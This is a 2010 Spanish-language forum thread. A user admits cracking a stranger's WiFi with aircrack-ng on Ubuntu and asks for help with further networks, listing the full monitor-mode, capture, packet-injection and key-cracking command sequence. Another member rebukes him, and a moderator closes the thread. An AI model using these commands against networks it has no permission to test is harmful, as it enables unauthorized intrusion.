---
title: "ayuda con ubuntu 10.04(aircrack)"
date: 2010-11-07
forum: Software
---

### Post by mclucky1293 on 2010-11-07
tengo instalado ubuntu en mi maquina ace como unos tres meses y ace poco  "descubri" lo de hackear redes con ubuntu y puse manos a la obra hace  ya dos semanas. 

ayer por fin logre con un tutorial sacar la clave de mi propio  router...muy al pedo intente hacerlo con una redcita de mierda que  andaba alli .... y lo logre!!! pero luego me salio el mensaje de "acceso  limitado"(la puse en la lap de mi hno, que usa win seven) ... :sad::sad::sad: 

lo intente con otras redes y cuando puse : airodump-ng -c (ch) -w nombre --bssid mac mon0 ... 
o sino : aireplay-ng -1 0 -a mac -h mi mac -e mon0 me decia que tenia que ir a la ayuda
:confused::confused::confused:
 
se que soy un tremendo conchudazo para pedir ayuda de este tipo, que me  van a denunciar, me van mentar hasta el canijo pero ... dale tio  necesito una mano ... 

tengo una notebook compaq, modelo . CQ42-121LA con chipset atheros ... y  ubuntu 10.04 ... por favor ayudenme ... ya llevo mucho tiempo y naa  ....:frown::frown: 
a continuacion dejo los comandos que use :

sudo su
airmon-ng 
airmon-ng start wlan0
airodump-ng mon0
crtl + c
airoddump-ng -c (ch) -w nombre --bssid mac mon0

----0 nueva shell 0----

sudo su
aireplay-ng -1 0 -a mac -h mi mac -e mon0
aireplay-ng -3 -b mac -h mi mac mon0

----0 nueva shell 0----

aircrack-ng *.cap

espero sus respuestas ... de antemano gracias a los que me puedan ayudar  ... y a los que no ... tambn gracias ... les dejo mi correo : [EMAIL="u2_elevation_93@hotmail.com"]u2_elevation_93@hotmail.com[/EMAIL]

---

### Post by Pan0ramix on 2010-11-07
No es mi función, pero este post lo van a hacer boleta.

La única solución que te veo es:

1. aprender a leer y escribir, cuidar el lenguaje
2. Crackear redes WiFi no te hace una buena persona que amerite ayuda sino todo lo contrario.
3. ANTES de hacer cualquier prueba documentate bien de todo lo que vas a hacer y ponderá los riesgos que ello traiga consigo.
4. Formatea y reinstala todo lo que has arruinado. Asi aprenderás.

Lee las reglas del foro y códigos de conducta.

---

### Post by guillermolisi on 2010-11-07
El usuario mclucky1293 ya fue advertido via PM.

Gracias por los comentarios. Post moderado y thread cerrado

---

